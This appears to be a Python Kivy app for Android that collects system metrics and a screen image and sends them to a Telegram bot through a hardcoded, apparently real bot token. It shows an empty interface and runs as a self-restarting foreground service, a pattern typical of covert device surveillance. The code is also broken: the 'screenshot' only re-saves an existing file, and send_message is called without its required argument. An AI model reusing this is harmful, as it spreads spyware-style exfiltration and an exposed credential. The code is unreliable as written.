import csv
import psutil
import datetime
import time

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.utils import platform
from kivy.core.image import Image as CoreImage

import telegram


class DataCollectorService:
    def __init__(self):
        self.bot = telegram.Bot(token='<6039664913:AAF5k__V4p8hFhYU8yTJVBl91Xwhr7pf_v0>')  # Replace with your bot token
        self.chat_id = '<@Data_transfer_or_sender_bot>'  # Replace with your chat ID

    def collect_data(self):
        # Get system metrics using psutil library
        cpu_percent = psutil.cpu_percent(interval=1)
        memory_percent = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Capture a screenshot using Kivy's `screenshot` method
        image = CoreImage('screenshot.png')
        image.save('screenshot.png')

        # Create a dictionary with the collected data
        data = {
            'Time': current_time,
            'CPU Percent': cpu_percent,
            'Memory Percent': memory_percent,
            'Disk Usage': disk_usage,
            'Photo': 'screenshot.png'  # Add the path to the captured screenshot
        }

        self.store_data(data)

    def store_data(self, data):
        # Open the CSV file in append mode
        with open('data.csv', 'a', newline='') as file:
            writer = csv.DictWriter(file, fieldnames=data.keys())

            # Check if the file is empty, then write the header row
            if file.tell() == 0:
                writer.writeheader()

            # Write the data row
            writer.writerow(data)

    def send_message(self, data):
        message = "Data collected:\n"
        for key, value in data.items():
            if key == 'Photo':
                self.bot.send_photo(chat_id=self.chat_id, photo=open(value, 'rb'))
                continue
            message += f"{key}: {value}\n"
        self.bot.send_message(chat_id=self.chat_id, text=message)


class DataCollectorApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical')
        self.service = DataCollectorService()

        if platform == 'android':
            from jnius import autoclass

            PythonService = autoclass('org.kivy.android.PythonService')
            service = PythonService.mService

            service.startForeground()
            service.setAutoRestartService(True)

        return layout

    def on_start(self):
        self.service.collect_data()
        self.send_data_and_exit()

    def send_data_and_exit(self, dt=None):
        self.service.send_message()
        self.stop()


if __name__ == '__main__':
    DataCollectorApp().run()
